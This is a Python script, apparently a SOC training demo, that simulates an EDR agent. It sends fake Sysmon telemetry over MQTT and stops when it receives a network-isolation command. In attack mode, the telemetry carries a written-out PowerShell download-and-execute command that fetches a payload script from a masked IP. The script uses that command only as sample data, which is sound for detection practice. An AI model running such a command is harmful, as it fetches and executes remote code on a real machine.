import time
import json
import random
import sys
import paho.mqtt.client as mqtt
import os

BROKER = "broker.hivemq.com"
PORT = 1883
HOSTNAME = "WIN-DESKTOP-01"
TOPIC_TELEMETRIA = f"stacholski/it/sensor/{HOSTNAME}"
TOPIC_COMANDO = f"stacholski/it/comando/{HOSTNAME}"

modo_ataque = "--attack" in sys.argv
ativo = True

def on_message(client, userdata, msg):
    global ativo
    comando = msg.payload.decode('utf-8')
    if comando == "ISOLATE_NETWORK":
        print(f"\n[!!!] COMANDO RECEBIDO DO SOC: Isolando {HOSTNAME} da rede corporativa [!!!]")
        ativo = False

def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] {HOSTNAME} conectado à rede corporativa.")
        client.subscribe(TOPIC_COMANDO)

client = mqtt.Client(f"EDR_Agent_{HOSTNAME}")
client.on_connect = on_connect
client.on_message = on_message

client.connect(BROKER, PORT, 60)
client.loop_start()

try:
    print(f"[*] Endpoint {HOSTNAME} operando. Modo de ataque: {modo_ataque}\n")
    
    while ativo:
        if modo_ataque:
            process_name = "powershell.exe"
            command_line = "powershell.exe -ExecutionPolicy Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.15.x.x/payload.ps1')\""
            status = "SUSPICIOUS_ACTIVITY"
            event_id = 1
        else:
            processos_normais = ["chrome.exe", "winword.exe", "explorer.exe"]
            process_name = random.choice(processos_normais)
            command_line = f"C:\\Windows\\System32\\{process_name}"
            status = "NORMAL"
            event_id = 1

        payload = {
            "sensor_id": HOSTNAME,
            "timestamp": time.time(),
            "event_source": "Microsoft-Windows-Sysmon",
            "event_id": event_id,
            "process_name": process_name,
            "command_line": command_line,
            "status": status
        }

        client.publish(TOPIC_TELEMETRIA, json.dumps(payload))
        print(f"[>] Log gerado: {process_name}")
        
        time.sleep(1.0 if modo_ataque else 4.0)

    print(f"[-] Máquina {HOSTNAME} isolada. Cortando comunicação.")
    client.loop_stop()
    client.disconnect()
    os._exit(0)

except KeyboardInterrupt:
    print("\n[-] Encerrando agente EDR...")
    client.loop_stop()
    client.disconnect()